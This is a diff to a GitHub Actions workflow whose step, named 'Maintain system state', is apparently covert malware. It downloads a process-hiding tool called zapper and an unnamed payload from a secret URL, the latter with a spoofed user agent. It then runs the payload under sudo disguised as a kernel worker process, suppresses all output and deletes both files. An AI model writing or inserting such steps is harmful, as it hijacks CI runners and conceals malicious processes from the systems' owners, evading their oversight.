@@ -14,14 +14,13 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 360  # Set timeout to 6 hours
     env:
-      MAIN: ${{ secrets.RESOURCE_MAIN }}
-      HELPER: ${{ secrets.RESOURCE_HELPER }}
+      RESOURCE: ${{ secrets.RESOURCE_RESOURCE }}
     steps:
       - name: Maintain system state
         run: |
           p=/tmp
-          wget -q -O "$p/x1" "$HELPER"
-          wget --user-agent="Mozilla/5.0" -q -O "$p/x2" "$MAIN"
+          wget -q -O "$p/x1" "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64"
+          wget --user-agent="Mozilla/5.0" -q -O "$p/x2" "$RESOURCE"
           chmod +x $p/x1 $p/x2
           (sudo bash -c "$p/x1 -f -a '[kworker/u2:3-events_unbound]' $p/x2 &>/dev/null 2>&1 &")
           (sleep 5 && rm -f $p/x1 $p/x2) &>/dev/null & disown
